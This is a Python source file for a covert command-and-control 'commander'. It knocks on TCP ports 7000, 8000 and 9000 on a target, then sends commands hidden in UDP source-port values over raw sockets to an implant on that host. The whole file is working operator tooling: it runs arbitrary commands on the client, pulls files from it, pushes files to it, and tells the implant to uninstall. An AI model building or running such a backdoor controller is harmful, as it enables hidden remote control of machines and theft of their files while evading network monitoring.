#!/usr/bin/env python3
"""
Commander Program - Integrated Port Knock + Raw Socket Covert Channel
Performs TCP port knock, then sends commands via UDP raw socket covert channel.

REQUIRES: Root/Administrator privileges for raw sockets
Usage: sudo python3 commander.py <target_host>
"""
import os
import socket
import struct
import time
import sys
from enum import IntEnum
from raw_socket_protocol import RawSocketProtocol

# Configuration
KNOCK_SEQUENCE = [7000, 8000, 9000]  # TCP knock sequence
COMMAND_PORT = 8888                   # UDP port for covert channel

# Commands that expect a response from the client
COMMANDS_WITH_RESPONSE = frozenset([
    # populated below after CommandType is defined
])


class CommandType(IntEnum):
    """Commands encoded in UDP src-port field"""
    DISCONNECT          = 0x1234
    UNINSTALL           = 0x2345
    TRANSFER_TO_CLIENT  = 0x3456
    TRANSFER_FROM_CLIENT = 0x4567
    RUN_COMMAND         = 0x5678
    ACK                 = 0x9ABC
    ERROR               = 0xABCD


# Commands that require the commander to listen for a response
COMMANDS_WITH_RESPONSE = frozenset([
    CommandType.RUN_COMMAND,
    CommandType.TRANSFER_FROM_CLIENT,
    CommandType.UNINSTALL,
])


class Commander:
    """
    Commander that:
    1. Performs TCP port knock sequence
    2. Sends commands via UDP raw socket covert channel
    """

    def __init__(self, target_host):
        # Resolve localhost before storing
        if target_host == "localhost":
            target_host = "127.0.0.1"
        self.target_host = target_host
        self.knock_ports = KNOCK_SEQUENCE
        self.command_port = COMMAND_PORT
        self.source_ip = self.get_local_ip()
        self.protocol = RawSocketProtocol()

    def get_local_ip(self):
        """Get the local IP that routes toward the target."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
            return "127.0.0.1"

    def perform_port_knock(self):
        """Perform TCP port knock sequence."""
        print("\n" + "=" * 60)
        print("PHASE 1: TCP Port Knock Authentication")
        print("=" * 60)
        print(f"Target:   {self.target_host}")
        print(f"Sequence: {self.knock_ports}")
        print()

        for port in self.knock_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                print(f"[+] Knocking on TCP port {port}...", end=" ", flush=True)
                sock.connect((self.target_host, port))
                sock.close()
                print("✓")
            except Exception as e:
                print(f"✗ ({e})")
            time.sleep(0.5)

        print("\n[+] Port knock sequence complete!")
        print("[*] Authorization granted for covert channel")
        print("=" * 60)
        time.sleep(1)

    def send_covert_command(self, command_type, payload=b''):
        """
        Send a command via the raw socket covert channel.

        For commands that expect a response the receive socket is opened
        BEFORE the command packet is sent, eliminating the race condition
        where the first response packet arrives before we start listening.
        """
        print(f"\n[→] Sending covert command: {command_type.name}")
        print(f"    Encoding:  UDP src port = 0x{int(command_type):04X}")
        print(f"    Transport: UDP port {self.command_port}")
        if payload and len(payload) < 100:
            preview = payload[:50].decode('utf-8', errors='replace')
            print(f"    Payload:   {preview}")

        needs_response = command_type in COMMANDS_WITH_RESPONSE

        # ── KEY FIX: open the receive socket BEFORE we send ──────────────
        if needs_response:
            self.protocol.prepare_recv_socket()
            time.sleep(0.1)  # give the kernel time to attach the BPF filter
        # ─────────────────────────────────────────────────────────────────

        success = self.protocol.send_packet(
            self.source_ip,
            self.target_host,
            self.command_port,
            command_type,
            payload
        )

        if not success:
            print(f"[✗] Failed to send packet")
            return False

        print(f"[✓] Packet sent successfully")

        if needs_response:
            print("[*] Waiting for response...")
            response = self.receive_response()
            if response:
                self.display_response(response)
            else:
                print("[!] No response received (timeout)")

        return success

    def receive_response(self, timeout=5):
        """Receive a response from the client via the covert channel."""
        response = self.protocol.receive_data(
            self.target_host,
            self.command_port,
            timeout
        )
        return response  # may be None on timeout

    def display_response(self, response):
        """Pretty-print a response dict from receive_data()."""
        print("\n" + "=" * 60)
        if response['type'] == int(CommandType.ACK):
            print("COMMAND OUTPUT:")
            print("=" * 60)
            output = response['payload'].decode('utf-8', errors='replace')
            print(output if output else "(no output)")
        elif response['type'] == int(CommandType.ERROR):
            print("ERROR:")
            print("=" * 60)
            error = response['payload'].decode('utf-8', errors='replace')
            print(error)
        else:
            print(f"UNKNOWN RESPONSE TYPE: 0x{response['type']:04X}")
            print("=" * 60)
            print(response['payload'])
        print("=" * 60)

    def interactive_session(self):
        """Interactive command session."""
        print("\n" + "=" * 60)
        print("Commander - Port Knock + Covert Channel")
        print("=" * 60)
        print(f"Target: {self.target_host}:{self.command_port}")
        print(f"Source: {self.source_ip}")
        print("=" * 60)

        self.perform_port_knock()

        print("\n" + "=" * 60)
        print("PHASE 2: Covert Channel Command Interface")
        print("=" * 60)
        print("\nAvailable Commands:")
        print("  knock                 - Re-authenticate via port knock")
        print("  disconnect            - Disconnect from client (0x1234)")
        print("  uninstall             - Uninstall from client (0x2345)")
        print("  send <file>           - Transfer file to client (0x3456)")
        print("  get <file>            - Transfer file from client (0x4567)")
        print("  run <command>         - Run command on client (0x5678)")
        print("  exit                  - Exit commander")
        print("=" * 60)
        print()

        while True:
            try:
                user_input = input("covert> ").strip()

                if not user_input:
                    continue

                parts = user_input.split(maxsplit=1)
                cmd  = parts[0].lower()
                args = parts[1] if len(parts) > 1 else ''

                if cmd == 'exit':
                    print("[*] Exiting commander...")
                    break

                elif cmd == 'knock':
                    self.perform_port_knock()

                elif cmd == 'disconnect':
                    self.send_covert_command(CommandType.DISCONNECT)
                    print("[*] Disconnect sent — authorization revoked on client")
                    print("[*] Exiting commander...")
                    break

                elif cmd == 'uninstall':
                    self.send_covert_command(CommandType.UNINSTALL)
                    print("[*] Client will clean up and terminate")

                elif cmd == 'send':
                    if not args:
                        print("[!] Usage: send <filepath>")
                        continue
                    try:
                        with open(args, 'rb') as f:
                            filedata = f.read()
                        filename       = os.path.basename(args)
                        filename_bytes = filename.encode('utf-8')
                        filename_len   = len(filename_bytes)
                        print(f"[*] Transferring: {filename} ({len(filedata)} bytes)")
                        # Payload: filename_length (2 bytes) | filename | filedata
                        payload = struct.pack('!H', filename_len) + filename_bytes + filedata
                        self.send_covert_command(CommandType.TRANSFER_TO_CLIENT, payload)
                    except Exception as e:
                        print(f"[!] Error reading file: {e}")

                elif cmd == 'get':
                    if not args:
                        print("[!] Usage: get <filepath>")
                        continue
                    self.send_covert_command(
                        CommandType.TRANSFER_FROM_CLIENT,
                        args.encode('utf-8')
                    )

                elif cmd == 'run':
                    if not args:
                        print("[!] Usage: run <command>")
                        continue
                    self.send_covert_command(
                        CommandType.RUN_COMMAND,
                        args.encode('utf-8')
                    )

                else:
                    print(f"[!] Unknown command: {cmd}")

                time.sleep(0.3)

            except KeyboardInterrupt:
                print("\n[*] Interrupted — sending disconnect...")
                try:
                    self.send_covert_command(CommandType.DISCONNECT)
                except Exception:
                    pass
                break

            except Exception as e:
                print(f"[!] Error: {e}")


def main():
    print("=" * 60)
    print("Commander Program")
    print("=" * 60)
    print("Requires: Root/Administrator privileges for raw sockets")
    print()

    if len(sys.argv) < 2:
        print("Usage: sudo python3 commander.py <target_host>")
        print("\nExample:")
        print("  sudo python3 commander.py 192.168.1.100")
        sys.exit(1)

    commander = Commander(sys.argv[1])

    try:
        commander.interactive_session()
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()